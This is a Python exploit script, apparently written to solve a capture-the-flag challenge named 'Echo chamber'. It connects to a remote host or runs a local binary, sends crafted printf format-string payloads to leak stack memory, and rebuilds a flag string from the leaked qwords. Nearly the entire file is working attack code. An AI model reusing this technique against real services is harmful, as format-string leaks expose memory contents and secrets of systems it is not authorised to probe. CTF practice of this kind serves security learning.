#!/usr/bin/env python3
import argparse
import os
import re
import select
import socket
import ssl
import subprocess
import sys
import time

FLAG_RE = re.compile(rb"[A-Za-z0-9_]+\{[^}\x00\n\r]*\}")
FLAG_START = 22          # first qword of flag[] on the printf stack view
FLAG_QWORDS = 16         # flag[128] -> 16 qwords
CHUNK = 6                # keep each fgets() line below 128 bytes


class RemoteConn:
    def __init__(self, host: str, port: int, use_ssl: bool = False):
        raw = socket.create_connection((host, port), timeout=10)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw = ctx.wrap_socket(raw, server_hostname=host)
        self.sock = raw

    def sendline(self, data: bytes):
        self.sock.sendall(data + b"\n")

    def recv_some(self, timeout=1.0) -> bytes:
        self.sock.settimeout(timeout)
        try:
            return self.sock.recv(4096)
        except socket.timeout:
            return b""

    def close(self):
        self.sock.close()


class LocalConn:
    def __init__(self, path: str):
        self.p = subprocess.Popen(
            [path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        os.set_blocking(self.p.stdout.fileno(), False)

    def sendline(self, data: bytes):
        self.p.stdin.write(data + b"\n")
        self.p.stdin.flush()

    def recv_some(self, timeout=1.0) -> bytes:
        r, _, _ = select.select([self.p.stdout], [], [], timeout)
        if not r:
            return b""
        try:
            return os.read(self.p.stdout.fileno(), 4096)
        except BlockingIOError:
            return b""

    def close(self):
        try:
            self.p.kill()
        except Exception:
            pass


def recv_until_prompt(conn, timeout=1.0) -> bytes:
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        chunk = conn.recv_some(0.2)
        if chunk:
            data += chunk
            if data.endswith(b"> "):
                break
    return data


def leak_words(conn):
    all_data = recv_until_prompt(conn, timeout=1.5)
    words = []

    for base in range(FLAG_START, FLAG_START + FLAG_QWORDS, CHUNK):
        positions = range(base, min(base + CHUNK, FLAG_START + FLAG_QWORDS))
        fmt = "LEAK:" + ".".join(f"%{i}$016lx" for i in positions) + ":END"

        conn.sendline(fmt.encode())
        all_data += recv_until_prompt(conn, timeout=1.5)

    for m in re.finditer(rb"LEAK:([0-9a-fA-F.]+):END", all_data):
        for part in m.group(1).split(b"."):
            if part:
                words.append(part.decode())

    if len(words) < FLAG_QWORDS:
        print(all_data.decode(errors="replace"), file=sys.stderr)
        raise RuntimeError(f"leak kurang: cuma dapat {len(words)} qword")

    return words[:FLAG_QWORDS]


def decode_flag(words):
    raw = b"".join(int(w, 16).to_bytes(8, "little") for w in words)
    raw = raw.split(b"\x00", 1)[0]

    m = FLAG_RE.search(raw)
    if not m:
        raise RuntimeError(f"flag pattern tidak ketemu, raw={raw!r}")

    return m.group(0), raw


def main():
    ap = argparse.ArgumentParser(description="Exploit Echo chamber format string leak")
    ap.add_argument("host", nargs="?", help="remote host")
    ap.add_argument("port", nargs="?", type=int, help="remote port")
    ap.add_argument("--ssl", action="store_true", help="connect using TLS/SSL")
    ap.add_argument("--local", metavar="BIN", help="run local binary instead of remote")
    args = ap.parse_args()

    if args.local:
        conn = LocalConn(args.local)
    else:
        if not args.host or not args.port:
            ap.error("remote mode but HOST/PORT missing, or use --local ./echo-chamber")
        conn = RemoteConn(args.host, args.port, args.ssl)

    try:
        words = leak_words(conn)
        flag, raw = decode_flag(words)
        print(f"[+] leaked raw: {raw.decode(errors='replace')}")
        print(f"<FLAG>{flag.decode(errors='replace')}</FLAG>")
    finally:
        conn.close()


if __name__ == "__main__":
    main()
